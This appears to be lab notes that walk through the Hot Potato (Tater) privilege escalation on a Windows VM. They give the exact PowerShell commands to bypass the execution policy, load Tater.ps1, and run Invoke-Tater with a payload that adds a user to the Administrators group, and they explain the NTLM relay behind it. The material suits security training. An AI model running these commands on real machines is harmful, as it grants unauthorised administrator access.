
---

## 🔥 **Hot Potato (Tater) Exploitation Breakdown**

### 🖥️ **Windows VM**

---

### **1. Launch PowerShell with relaxed execution policy**

```powershell
powershell.exe -nop -ep bypass
```

- **`-nop`**: No profile — avoids running user PowerShell profiles that might block or log actions.
    
- **`-ep bypass`**: Execution Policy is bypassed — allows running unsigned PowerShell scripts (needed for Tater).
    

> 🧠 _Why?_ PowerShell normally blocks unsigned scripts. This disables that restriction.

---

### **2. Import the Tater PowerShell module**

```powershell
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
```

- **`Tater.ps1`**: This is a PowerShell implementation of the Hot Potato attack.
    
- **Import-Module** loads the script so its functions (like `Invoke-Tater`) become available in your session.
    

> 🔧 Tater exploits:
> 
> - **NBNS spoofing**
>     
> - **HTTP-to-SMB relay (NTLM relay)**
>     
> - **Windows services misconfigurations**
>     

---

### **3. Execute the exploit**

```powershell
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

- **`Invoke-Tater`**: This runs the actual exploit.
    
- **`-Trigger 1`**: Specifies the type of attack to use — Trigger 1 is a default, known working one.
    
- **`-Command "net localgroup administrators user /add"`**:
    
    - Payload command.
        
    - It adds the user `user` to the `Administrators` group.
        

> 🧠 _What's Happening?_
> 
> - Tater hijacks a SYSTEM process's connection.
>     
> - It uses **NTLM relay attacks** to trick a system process into authenticating and relaying that authentication to gain **SYSTEM-level execution** of your specified command.
>     

---

### **4. Confirm privilege escalation**

```powershell
net localgroup administrators
```

- Shows members of the local `Administrators` group.
    
- If the `user` account is listed, the privilege escalation succeeded.
    

---
